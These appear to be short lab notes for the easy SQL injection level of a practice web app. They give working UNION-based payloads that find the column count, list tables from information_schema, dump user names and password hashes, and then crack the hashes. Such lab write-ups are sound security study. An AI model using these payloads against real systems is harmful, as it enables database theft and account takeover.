## SQL injection Easy

0. Use a brower inspector to check http requests
 - Headers: HTTP Get request
 - Payload: query string parameters
 - Cookies: PHPSESSION, security level

1. Get  Error
`SELECT first_name, last_name FROM users WHERE user_id = '''`

2. Get the number of columns
`1' order by 1`
`1' order by 2`
`1' order by 3`

`Binary Search`

3. Get columns from user table
https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html
https://portswigger.net/web-security/sql-injection/cheat-sheet
`SELECT * FROM information_schema.tables`
`' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name like 'user%'#`

4. Get id & pwd
`' UNION SELECT user, password FROM users#`

5. Crack the password
crackstation





